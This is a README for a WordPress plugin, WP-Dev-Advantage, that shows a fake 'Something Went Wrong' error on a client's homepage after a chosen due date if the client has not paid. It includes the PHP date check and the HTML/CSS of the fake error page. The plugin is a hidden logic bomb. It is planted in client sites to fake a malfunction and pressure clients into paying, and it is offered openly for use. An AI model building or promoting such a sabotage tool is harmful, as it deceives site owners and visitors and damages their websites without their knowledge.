
# 🦾 WP-Dev-Advantage

WP-Dev-Advantage is a powerful WordPress plugin that displays fake errors on your homepage. With this plugin, you can set a specific due date, and it will automatically display these fake 'errors' on the homepage if a client doesn't pay you on time.



## Modify Plugin 🗃️

#### 1. Enter the date for displaying the error (Line 53)
```php
//July 15, 2024 (YYYY-MM-DD)
$check_date = new DateTime('2024-07-15');
```

#### 2. Edit this fake error (Line 56)
```html
<style>
    body {
        background-color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        font-family: Arial, sans-serif;
    }

    .message-container {
        text-align: center;
    }
</style>

<div class="message-container">
    <h1>Something Went Wrong</h1>
    <p>Please Contact Administrator / Developer</p>
</div>
```


## Authors

- [@jaycee0610](https://www.github.com/jaycee0610)

